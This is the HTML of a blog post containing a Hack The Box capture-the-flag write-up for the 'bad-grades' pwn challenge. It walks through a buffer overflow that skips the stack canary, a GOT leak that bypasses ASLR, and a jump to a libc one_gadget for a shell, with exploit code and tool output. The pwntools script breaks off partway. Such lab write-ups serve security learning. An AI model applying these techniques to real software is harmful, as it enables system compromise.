@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 6.3.0">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha256-/4UQcSmErDzPCMAiuOiWPVVsNN2s3ZY/NsmXNcj0IFc=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/themes/blue/pace-theme-minimal.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pace/1.2.4/pace.min.js" integrity="sha256-gqd7YTjg/BtfqWSwsJOvndl0Bxc8gFImLEkXQT8+qj0=" crossorigin="anonymous"></script>
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"fdlucifer.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.15.0","exturl":true,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"bookmark":{"enable":true,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="详细过程及exp1. Basic checks:1234567891011┌──(root💀kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;Bad_grades]└─# file bad_grades bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, int">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack-The-Box-pwn-challenge[bad-grades]">
+<meta property="og:url" content="https://fdlucifer.github.io/2021/09/01/bad-grades/index.html">
+<meta property="og:site_name" content="lUc1f3r11&#39;s blog">
+<meta property="og:description" content="详细过程及exp1. Basic checks:1234567891011┌──(root💀kali)-[~&#x2F;hackthebox&#x2F;challenge&#x2F;pwn&#x2F;Bad_grades]└─# file bad_grades bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, int">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades1.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades2.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades3.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades4.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades5.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades6.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades7.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades8.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades9.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades10.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades11.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades12.jpg">
+<meta property="og:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades13.jpg">
+<meta property="article:published_time" content="2021-09-01T08:35:08.000Z">
+<meta property="article:modified_time" content="2021-09-01T13:58:22.440Z">
+<meta property="article:author" content="lUc1f3r11">
+<meta property="article:tag" content="pwn">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades.jpg">
+
+
+<link rel="canonical" href="https://fdlucifer.github.io/2021/09/01/bad-grades/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://fdlucifer.github.io/2021/09/01/bad-grades/","path":"2021/09/01/bad-grades/","title":"Hack-The-Box-pwn-challenge[bad-grades]"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Hack-The-Box-pwn-challenge[bad-grades] | lUc1f3r11's blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">lUc1f3r11's blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">by lUc1f3r11</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="Search" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags<span class="badge">42</span></a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories<span class="badge">32</span></a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives<span class="badge">203</span></a></li><li class="menu-item menu-item-schedule"><a href="/schedule/" rel="section"><i class="fa fa-calendar fa-fw"></i>Schedule</a></li><li class="menu-item menu-item-sitemap"><a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>Sitemap</a></li><li class="menu-item menu-item-commonweal"><a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>Commonweal 404</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E8%BF%87%E7%A8%8B%E5%8F%8Aexp"><span class="nav-number">1.</span> <span class="nav-text">详细过程及exp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-Basic-checks"><span class="nav-number">1.1.</span> <span class="nav-text">1. Basic checks:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Spot-the-first-vulnerability-%E2%80%94-buffer-overflow"><span class="nav-number">1.2.</span> <span class="nav-text">2. Spot the first vulnerability — buffer overflow:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-Spot-the-second-vulnerability-%E2%80%94-format-string"><span class="nav-number">1.3.</span> <span class="nav-text">3. Spot the second vulnerability — format string:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-Join-two-vulnerabilities-and-skip-the-stack-canary"><span class="nav-number">1.4.</span> <span class="nav-text">4. Join two vulnerabilities and skip the stack canary:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-Bypass-ASLR-with-ret2puts"><span class="nav-number">1.5.</span> <span class="nav-text">5. Bypass ASLR with ret2puts:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#6-Connect-all-the-dots-and-get-the-shell"><span class="nav-number">1.6.</span> <span class="nav-text">6. Connect all the dots and get the shell:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#7-Final-exploit"><span class="nav-number">1.7.</span> <span class="nav-text">7. Final exploit:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%91%98%E8%87%AA-%E8%87%B4%E6%95%AC%E5%8E%9F%E4%BD%9C-%E2%80%A6%E2%80%A6"><span class="nav-number">2.</span> <span class="nav-text">摘自(致敬原作)……</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="lUc1f3r11"
+      src="/images/lucifer11.jpg">
+  <p class="site-author-name" itemprop="name">lUc1f3r11</p>
+  <div class="site-description" itemprop="description">All things about infosec & ctf</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">203</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">32</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">42</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;FDlucifer"><i class="fab fa-github fa-fw"></i>GitHub</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="bWFpbHRvOjExODUxNTE4NjdAcXEuY29t" title="E-Mail → mailto:1185151867@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;fdlucifer11"><i class="fab fa-twitter fa-fw"></i>Twitter</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL3Byb2ZpbGUucGhwP2lkPTEwMDAxOTY5NDUyODYyMA==" title="FB Page → https:&#x2F;&#x2F;www.facebook.com&#x2F;profile.php?id&#x3D;100019694528620"><i class="fab fa-facebook fa-fw"></i>FB Page</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ19saVRlaDRSMUZNYnBWeGxwTWUtdnc=" title="YouTube → https:&#x2F;&#x2F;www.youtube.com&#x2F;channel&#x2F;UC_liTeh4R1FMbpVxlpMe-vw"><i class="fab fa-youtube fa-fw"></i>YouTube</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly93d3cuaW5zdGFncmFtLmNvbS95YW5nODkyOS8=" title="Instagram → https:&#x2F;&#x2F;www.instagram.com&#x2F;yang8929&#x2F;"><i class="fab fa-instagram fa-fw"></i>Instagram</span>
+      </span>
+      <span class="links-of-author-item">
+        <span class="exturl" data-url="aHR0cHM6Ly9pbmZvc2VjLmV4Y2hhbmdlL0BsVWMxZjNyMTE=" title="infosec.exchange → https:&#x2F;&#x2F;infosec.exchange&#x2F;@lUc1f3r11"><i class="custom mastodon fa-fw"></i>infosec.exchange</span>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <span class="exturl cc-opacity" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/big/by_nc_sa.svg" alt="Creative Commons"></span>
+  </div>
+
+        </div>
+      </div>
+        <div class="back-to-top animated" role="button" aria-label="Back to top">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          Links
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9hdHN1ZDAubWUv" title="https:&#x2F;&#x2F;atsud0.me&#x2F;">atsud0</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly9kcm9pZGthbGkuZ2l0aHViLmlvLw==" title="https:&#x2F;&#x2F;droidkali.github.io&#x2F;">记忆里的纯真</span>
+            </li>
+            <li class="links-of-blogroll-item">
+              <span class="exturl" data-url="aHR0cHM6Ly94aWFvbGltYXJzLndvcmRwcmVzcy5jb20v" title="https:&#x2F;&#x2F;xiaolimars.wordpress.com&#x2F;">小离</span>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://fdlucifer.github.io/2021/09/01/bad-grades/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/lucifer11.jpg">
+      <meta itemprop="name" content="lUc1f3r11">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="lUc1f3r11's blog">
+      <meta itemprop="description" content="All things about infosec & ctf">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Hack-The-Box-pwn-challenge[bad-grades] | lUc1f3r11's blog">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Hack-The-Box-pwn-challenge[bad-grades]
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+      
+
+      <time title="Created: 2021-09-01 16:35:08 / Modified: 21:58:22" itemprop="dateCreated datePublished" datetime="2021-09-01T16:35:08+08:00">2021-09-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/" itemprop="url" rel="index"><span itemprop="name">pwn</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pwn/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="详细过程及exp"><a href="#详细过程及exp" class="headerlink" title="详细过程及exp"></a>详细过程及exp</h2><h3 id="1-Basic-checks"><a href="#1-Basic-checks" class="headerlink" title="1. Basic checks:"></a>1. Basic checks:</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]</span><br><span class="line">└─<span class="comment"># file bad_grades </span></span><br><span class="line">bad_grades: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 3.2.0, BuildID[sha1]=b60153cf4a14cf069c511baaae94948e073839fe, stripped</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]</span><br><span class="line">└─<span class="comment"># checksec bad_grades</span></span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/challenge/pwn/Bad_grades/bad_grades&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<span id="more"></span>
+
+<h3 id="2-Spot-the-first-vulnerability-—-buffer-overflow"><a href="#2-Spot-the-first-vulnerability-—-buffer-overflow" class="headerlink" title="2. Spot the first vulnerability — buffer overflow:"></a>2. Spot the first vulnerability — buffer overflow:</h3><p>The first vulnerability lies in the total grades counter buffer, which could be overflowed with more than 33 Bytes.</p>
+<p>Make a loop that will add 34 grades to the grade pool.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades.jpg"></li>
+</ul>
+<p>Spot the stack smashing — potential buffer overflow.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades1.jpg"></li>
+</ul>
+<h3 id="3-Spot-the-second-vulnerability-—-format-string"><a href="#3-Spot-the-second-vulnerability-—-format-string" class="headerlink" title="3. Spot the second vulnerability — format string:"></a>3. Spot the second vulnerability — format string:</h3><p>Since there is a stack canary in use, it will be impossible to exploit a buffer overflow, without leaking somehow stack canary value, brute-forcing it, or somehow skipping this value while overflowing the rest of the stack data.</p>
+<p>The binary is stripped, but the overflowed function can be spotted with ease using static binary analysis with a disassembler.</p>
+<p>It shows the information about the data type (%lf for double) that will be stored in memory.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades2.jpg"></li>
+</ul>
+<p>You can use . (dot character) to skip writing data in a referenced variable if the user input is collected with scanf(“%lf”, &amp;grade[i])</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades3.jpg"></li>
+</ul>
+<h3 id="4-Join-two-vulnerabilities-and-skip-the-stack-canary"><a href="#4-Join-two-vulnerabilities-and-skip-the-stack-canary" class="headerlink" title="4. Join two vulnerabilities and skip the stack canary:"></a>4. Join two vulnerabilities and skip the stack canary:</h3><p>Since stack cookie is just before return address, you can skip writing to canary and overwrite the RSP register, thus controlling execution flow.</p>
+<p>One thing to mention, there is a (35) RBP register between (34) stack canary and (36) RSP register.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades4.jpg"></li>
+</ul>
+<p>The last problem is the type of the variable set by scanf(“%lf”, &amp;grade[i]) which is double . That means during overflow, the return address will be overwritten not by for example 65 but 65.0 .</p>
+<p>Doubles are stored in memory differently, you can learn how to convert double to binary <span class="exturl" data-url="aHR0cHM6Ly93d3cubG9nMmJhc2UyLmNvbS9zdG9yYWdlL2hvdy1mbG9hdC12YWx1ZXMtYXJlLXN0b3JlZC1pbi1tZW1vcnkuaHRtbA==">here<i class="fa fa-external-link-alt"></i></span>.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades5.jpg"></li>
+</ul>
+<p>There are three steps in Python2 in order to convert your desire pointer value to the double representation</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades6.jpg"></li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">double_pointer</span>(<span class="params">pointer_value</span>):</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;Convert x64 pointer to double representation&#x27;&#x27;&#x27;</span></span><br><span class="line">    byte_string = p64(pointer_value)</span><br><span class="line">    hex_byte_string = binascii.hexlify(byte_string)</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&#x27;d&#x27;</span>, hex_byte_string.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">0</span>]</span><br></pre></td></tr></table></figure>
+
+<p>Armed with the above script you are ready to overwrite the RSP address.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades7.jpg"></li>
+</ul>
+<p>The RSP below successfully returns to the printf()</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades8.jpg"></li>
+</ul>
+<h3 id="5-Bypass-ASLR-with-ret2puts"><a href="#5-Bypass-ASLR-with-ret2puts" class="headerlink" title="5. Bypass ASLR with ret2puts:"></a>5. Bypass ASLR with ret2puts:</h3><p>First, the PLT address of puts() will be needed with the corresponding GOT address to be leaked.</p>
+<p>Since this is an x64 architecture it will be needed a ROP gadget to set up the GOT address of puts in the RDI register, so it could be used by puts().</p>
+<p>Additionally, main() address will be needed for returning to vulnerable function and overflow it again with the calculated address of one_gadget.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades9.jpg"></li>
+</ul>
+<p>Set the grade_counter to 39 — since now additional values will be stored on the stack.</p>
+<p>Send the payload in correct order, to leak GOT entry with puts()</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades10.jpg"></li>
+</ul>
+<p>Run it against the remote target to check if it works.</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades11.jpg"></li>
+</ul>
+<h3 id="6-Connect-all-the-dots-and-get-the-shell"><a href="#6-Connect-all-the-dots-and-get-the-shell" class="headerlink" title="6. Connect all the dots and get the shell:"></a>6. Connect all the dots and get the shell:</h3><p>Calculate the <span class="exturl" data-url="aHR0cHM6Ly9rYXJvbC1tYXp1cmVrOTUubWVkaXVtLmNvbS9wd24tcmVzdGF1cmFudC1jaGFsbGVuZ2UtaHRiLTIyODdhMWY4M2NmNA==">one_gadget<i class="fa fa-external-link-alt"></i></span> with leaked puts using relative addressing.<br>(puts address is further than execve() relative it is 0x80aa0–0x4f432 )</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]</span><br><span class="line">└─<span class="comment"># one_gadget libc.so.6</span></span><br><span class="line">0x4f3d5 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rsp &amp; 0xf == 0</span><br><span class="line">  rcx == NULL</span><br><span class="line"></span><br><span class="line">0x4f432 execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x40, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x40] == NULL</span><br><span class="line"></span><br><span class="line">0x10a41c execve(<span class="string">&quot;/bin/sh&quot;</span>, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/challenge/pwn/Bad_grades]</span><br><span class="line">└─<span class="comment"># objdump -TR libc.so.6 | grep puts</span></span><br><span class="line">0000000000080aa0 g    DF .text  0000000000000200  GLIBC_2.2.5 _IO_puts</span><br><span class="line">0000000000080aa0  w   DF .text  0000000000000200  GLIBC_2.2.5 puts</span><br><span class="line">0000000000126550 g    DF .text  00000000000004d8  GLIBC_2.2.5 putspent</span><br><span class="line">0000000000128460 g    DF .text  00000000000002ee  GLIBC_2.10  putsgent</span><br><span class="line">000000000007f2d0  w   DF .text  000000000000018c  GLIBC_2.2.5 fputs</span><br><span class="line">000000000007f2d0 g    DF .text  000000000000018c  GLIBC_2.2.5 _IO_fputs</span><br><span class="line">000000000008a710  w   DF .text  000000000000008f  GLIBC_2.2.5 fputs_unlocked</span><br></pre></td></tr></table></figure>
+
+<p>Overflow it again with calculated one_gadget</p>
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/bad-grades12.jpg"></li>
+</ul>
+<h3 id="7-Final-exploit"><a href="#7-Final-exploit" class="headerlink" title="7. Final exploit:"></a>7. Final exploit:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;info&quot;</span></span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;/usr/lib/x86_64-linux-gnu/libc-2.31.so&quot;)</span></span><br><span class="line"></span><br><span class="line">rop = ROP(<span class="string">&quot;bad_grades&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;bad_grades&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&quot;138.68.155.238&quot;</span>, <span class="number">30565</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p = process(&quot;./bad_grades&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;&#x27;&#x27; b * 0x4010ec</span></span><br><span class="line"><span class="comment">#c</span></span><br><span class="line"><span class="comment">#&#x27;&#x27;&#x27;)</span></span><br><span 